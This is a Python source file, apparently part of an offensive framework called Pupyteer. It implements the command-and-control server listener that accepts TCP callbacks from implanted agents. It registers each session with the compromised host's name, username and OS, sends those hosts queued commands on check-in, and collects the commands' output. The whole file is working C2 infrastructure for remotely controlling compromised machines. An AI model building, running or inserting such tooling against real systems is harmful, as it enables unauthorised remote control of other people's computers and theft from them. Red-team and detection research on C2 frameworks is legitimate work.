"""Async TCP listener for Pupyteer agent callbacks.

Provides the core C2 server transport: accepts inbound TCP connections
from Pupyteer agents, performs session registration, dispatches queued
command on check-in, and collects command output.

Protocol: newline-delimited JSON messages over a plain TCP socket.

Message types:
    Agent → Server:
        {"type": "register", "hostname": "...", "os": "...", "arch": "...",
         "username": "...", "agent_version": "..."}
        {"type": "checkin", "session_id": "..."}
        {"type": "output", "session_id": "...", "command_id": "...",
         "output": "..."}

    Server → Agent:
        {"type": "registered", "session_id": "..."}
        {"type": "commands", "commands": [{"command_id": "...", "command": "..."}]}
        {"type": "ack"}
        {"type": "error", "message": "..."}
"""
from __future__ import annotations

import asyncio
import json
import logging
import time
import uuid
from typing import Any, Dict, Optional

from pupyteer.server.core.logging import AuditLogger
from pupyteer.server.sessions.manager import SessionInfo

logger = logging.getLogger("pupyteer.transports.listener")


class PendingCommand:
    """Tracks a command waiting for agent delivery / response."""

    __slots__ = ("command_id", "command", "queued_at", "delivered")

    def __init__(self, command_id: str, command: str, queued_at: float):
        self.command_id = command_id
        self.command = command
        self.queued_at = queued_at
        self.delivered = False


class ConnectionState:
    """Mutable state for one connected agent."""

    __slots__ = ("session_id", "writer", "addr", "connected_at", "last_activity")

    def __init__(
        self,
        session_id: str,
        writer: asyncio.StreamWriter,
        addr: str,
    ):
        self.session_id = session_id
        self.writer = writer
        self.addr = addr
        self.connected_at = time.time()
        self.last_activity = time.time()


class AgentListener:
    """Async TCP server that catches Pupyteer agent callbacks.

    Lifecycle:
        1. Instantiate with config dict, a SessionManager, and an AuditLogger.
        2. Call ``await listener.start()`` — blocks (via asyncio.start_server)
           until ``stop()`` is called.
        3. On agent connect → handle_client() drives the JSON-line protocol.
        4. Registration creates a ``SessionInfo`` via the session manager.
        5. Check-in returns any queued commands and updates last_checkin.
        6. Output resolves the pending command and acks through the manager.
    """

    def __init__(
        self,
        config: Dict[str, Any],
        session_manager: Any,
        audit_logger: AuditLogger,
    ):
        self._host: str = config.get("host", "0.0.0.0")
        self._port: int = int(config.get("port", 8443))
        self._session_manager = session_manager
        self._audit = audit_logger

        self._server: Optional[asyncio.base_events.Server] = None
        self._connections: Dict[str, ConnectionState] = {}  # session_id → state
        self._lock = asyncio.Lock()
        self._stats: Dict[str, int] = {
            "connections": 0,
            "bytes_sent": 0,
            "bytes_received": 0,
            "sessions_created": 0,
            "commands_dispatched": 0,
        }

    # ------------------------------------------------------------------
    #  Lifecycle
    # ------------------------------------------------------------------

    async def start(self) -> None:
        """Bind the TCP server and start accepting connections."""
        self._server = await asyncio.start_server(
            self._handle_client,
            host=self._host,
            port=self._port,
        )
        addrs = ", ".join(str(s.getsockname()) for s in self._server.sockets)
        logger.info("Agent listener listening on %s", addrs)
        self._audit.log_event("listener_started", {
            "host": self._host,
            "port": self._port,
        })

    async def stop(self) -> None:
        """Gracefully close the server and all active connections."""
        # Close every active connection first
        async with self._lock:
            for sid, conn in list(self._connections.items()):
                try:
                    conn.writer.close()
                    await conn.writer.wait_closed()
                except Exception:
                    pass
            self._connections.clear()

        if self._server is not None:
            self._server.close()
            await self._server.wait_closed()
            self._server = None

        logger.info("Agent listener stopped on %s:%d", self._host, self._port)
        self._audit.log_event("listener_stopped", {
            "host": self._host,
            "port": self._port,
            "stats": dict(self._stats),
        })

    # ------------------------------------------------------------------
    #  Per-connection protocol handler
    # ------------------------------------------------------------------

    async def _handle_client(
        self,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
    ) -> None:
        """Read newline-delimited JSON and dispatch each message.

        One TCP connection is expected to carry the lifetime of a single
        agent session (register → many checkin/output cycles).  If an
        agent re-connects it will register again and receive a new
        session_id.
        """
        addr = writer.get_extra_info("peername") or ("unknown", 0)
        remote_str = f"{addr[0]}:{addr[1]}"
        session_id: Optional[str] = None

        logger.debug("New agent connection from %s", remote_str)
        self._stats["connections"] += 1

        try:
            while True:
                try:
                    line = await reader.readline()
                except (ConnectionError, OSError):
                    break

                if not line:
                    # EOF — agent disconnected
                    break

                self._stats["bytes_received"] += len(line)

                # Strip whitespace / newline
                line_str = line.decode("utf-8", errors="replace").strip()
                if not line_str:
                    continue

                # Parse JSON
                try:
                    msg: Dict[str, Any] = json.loads(line_str)
                except json.JSONDecodeError as exc:
                    logger.warning(
                        "Malformed JSON from %s: %s", remote_str, exc
                    )
                    await self._send_json(
                        writer,
                        {"type": "error", "message": "invalid_json"},
                    )
                    continue

                # Dispatch
                try:
                    response = await self._process_message(
                        msg, remote_str, writer
                    )
                    # Capture session_id from registration for cleanup
                    if (
                        msg.get("type") == "register"
                        and response
                        and response.get("type") == "registered"
                    ):
                        session_id = response["session_id"]
                except Exception as exc:
                    logger.exception(
                        "Error processing %s from %s: %s",
                        msg.get("type"), remote_str, exc,
                    )
                    await self._send_json(
                        writer,
                        {"type": "error", "message": "internal_error"},
                    )
                    continue

                if response is not None:
                    sent = await self._send_json(writer, response)
                    if sent == -1:
                        break  # write failed, drop connection

        except asyncio.CancelledError:
            pass
        except Exception as exc:
            logger.exception("Unhandled error in handler for %s: %s", remote_str, exc)
        finally:
            # Clean up connection tracking
            if session_id:
                async with self._lock:
                    self._connections.pop(session_id, None)
                logger.debug("Session %s disconnected from %s", session_id, remote_str)

            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass

    # ------------------------------------------------------------------
    #  Message dispatch
    # ------------------------------------------------------------------

    async def _process_message(
        self,
        msg: Dict[str, Any],
        remote: str,
        writer: asyncio.StreamWriter,
    ) -> Optional[Dict[str, Any]]:
        """Route a parsed JSON message to the appropriate handler."""
        msg_type = msg.get("type", "")

        if msg_type == "register":
            return await self._handle_register(msg, remote, writer)
        if msg_type == "checkin":
            return await self._handle_checkin(msg, writer)
        if msg_type == "output":
            return await self._handle_output(msg)

        logger.warning("Unknown message type '%s' from %s", msg_type, remote)
        return {"type": "error", "message": f"unknown_type: {msg_type}"}

    # ------------------------------------------------------------------
    #  Register
    # ------------------------------------------------------------------

    async def _handle_register(
        self,
        msg: Dict[str, Any],
        remote: str,
        writer: asyncio.StreamWriter,
    ) -> Dict[str, Any]:
        """Create a new session and register it."""
        session_id = str(uuid.uuid4())[:12]

        info = SessionInfo(
            session_id=session_id,
            hostname=msg.get("hostname", "unknown"),
            os=msg.get("os", "unknown"),
            arch=msg.get("arch", "unknown"),
            username=msg.get("username", "unknown"),
            agent_version=msg.get("agent_version", "unknown"),
            remote_address=remote,
        )

        registered_id = await self._session_manager.register(info)

        async with self._lock:
            self._connections[registered_id] = ConnectionState(
                session_id=registered_id,
                writer=writer,
                addr=remote,
            )

        self._stats["sessions_created"] += 1

        self._audit.log_event(
            "session_registered",
            {
                "session_id": registered_id,
                "hostname": info.hostname,
                "os": info.os,
                "arch": info.arch,
                "username": info.username,
                "remote_address": remote,
            },
            session=registered_id,
        )
        logger.info(
            "Agent registered: %s (%s@%s) from %s",
            registered_id, info.username, info.hostname, remote,
        )

        return {"type": "registered", "session_id": registered_id}

    # ------------------------------------------------------------------
    #  Check-in
    # ------------------------------------------------------------------

    async def _handle_checkin(
        self,
        msg: Dict[str, Any],
        writer: asyncio.StreamWriter,
    ) -> Dict[str, Any]:
        """Return queued commands for the session and bump last_checkin."""
        session_id = msg.get("session_id", "")

        # Update heartbeat
        await self._session_manager.update_checkin(session_id)

        # Refresh connection writer (agent may have reconnected)
        async with self._lock:
            conn = self._connections.get(session_id)
            if conn is not None:
                if conn.writer is not writer:
                    conn.writer = writer
                conn.last_activity = time.time()

        # Pull pending commands from session manager
        pending: list = await self._session_manager.get_pending_commands(session_id)

        commands = []
        for cmd in pending:
            commands.append({
                "command_id": cmd["command_id"],
                "command": cmd["command"],
            })
            # Mark as delivered so we don't re-send on next check-in
            # (session manager keeps them until ack)
            cmd["status"] = "delivered"

        if commands:
            self._stats["commands_dispatched"] += len(commands)
            logger.debug(
                "Dispatching %d command(s) to session %s",
                len(commands), session_id,
            )

        return {"type": "commands", "commands": commands}

    # ------------------------------------------------------------------
    #  Output
    # ------------------------------------------------------------------

    async def _handle_output(self, msg: Dict[str, Any]) -> Dict[str, Any]:
        """Resolve a pending command with its output."""
        session_id = msg.get("session_id", "")
        command_id = msg.get("command_id", "")
        output = msg.get("output", "")

        await self._session_manager.ack_command(session_id, command_id, output)

        self._audit.log_event(
            "session_command_ack",
            {
                "session_id": session_id,
                "command_id": command_id,
                "output_length": len(output),
            },
            session=session_id,
        )
        logger.debug(
            "Received output for command %s (session %s, %d chars)",
            command_id, session_id, len(output),
        )

        return {"type": "ack"}

    # ------------------------------------------------------------------
    #  Helpers
    # ------------------------------------------------------------------

    async def _send_json(
        self,
        writer: asyncio.StreamWriter,
        payload: Dict[str, Any],
    ) -> int:
        """Serialize *payload* to JSON, write with trailing newline.

        Returns the number of bytes written, or -1 on failure.
        """
        try:
            data = (json.dumps(payload) + "\n").encode("utf-8")
            writer.write(data)
            await writer.drain()
            self._stats["bytes_sent"] += len(data)
            return len(data)
        except (ConnectionError, OSError) as exc:
            logger.warning("Failed to send to peer: %s", exc)
            return -1

    # ------------------------------------------------------------------
    #  Stats / introspection
    # ------------------------------------------------------------------

    @property
    def stats(self) -> Dict[str, Any]:
        """Return a snapshot of listener statistics."""
        return {
            **self._stats,
            "active_connections": len(self._connections),
            "host": self._host,
            "port": self._port,
        }

    @property
    def is_running(self) -> bool:
        return self._server is not None

    def get_connection_sessions(self) -> list:
        """Return list of active session IDs."""
        return list(self._connections.keys())
